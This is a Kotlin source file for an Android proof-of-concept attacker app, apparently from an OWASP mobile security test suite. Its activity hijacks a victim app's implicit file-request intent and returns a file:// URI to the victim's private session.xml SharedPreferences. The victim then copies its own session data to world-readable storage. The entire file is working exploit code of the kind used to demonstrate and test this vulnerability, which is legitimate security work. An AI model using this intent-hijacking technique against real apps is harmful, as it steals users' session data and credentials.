package com.attacker.filestealer

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log

// SUMMARY: Attacker app that intercepts the victim's REQUEST_FILE implicit intent
// and returns a file:// URI pointing to the victim's internal SharedPreferences file.
// This causes the victim to read its own sensitive data and copy it to external storage.

class EvilContentActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Return a URI pointing to the victim app's internal SharedPreferences file.
        // The victim app will read this file via contentResolver.openInputStream()
        // and copy it to its external cache directory (world-readable).
        val maliciousUri = Uri.parse("file:///data/data/org.owasp.mastestapp/shared_prefs/session.xml")

        Log.w("ATTACKER", "Intercepted REQUEST_FILE intent!")
        Log.w("ATTACKER", "Returning malicious URI: $maliciousUri")

        setResult(RESULT_OK, Intent().apply {
            data = maliciousUri
        })

        finish()
    }
}
